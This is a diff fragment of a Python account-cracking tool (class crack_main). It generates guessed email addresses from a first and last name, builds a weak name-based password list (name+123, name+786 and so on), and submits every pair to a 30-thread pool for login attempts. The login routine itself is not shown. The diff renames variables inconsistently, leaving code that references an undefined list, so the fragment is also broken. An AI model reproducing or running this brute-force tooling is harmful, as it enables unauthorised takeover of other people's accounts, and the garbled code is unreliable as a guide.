@@ -393,7 +393,7 @@ class crack_main():
                 global methods
                 os.system("clear");print(logo)
                 import requests,random
-                zia=[]
+                user=[]
                 print(" [*] First Name Example Hamza,Areesha")
                 first = input(" First Name : ")
                 last = input(" Last Name : ")
@@ -409,9 +409,9 @@ class crack_main():
                         else:
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                        zia = open('mail.txt', 'r').read().splitlines()
+                        uss = open('mail.txt', 'r').read().splitlines()
                 with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(fo))
+                        total = str(len(zia))
                         clear()
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
@@ -427,7 +427,7 @@ class crack_main():
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 with ThreadPool(max_workers=30) as formSubmit:
-                        for user in zia:
+                        for user in uss:
                                 iid,name = user.split('|')
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
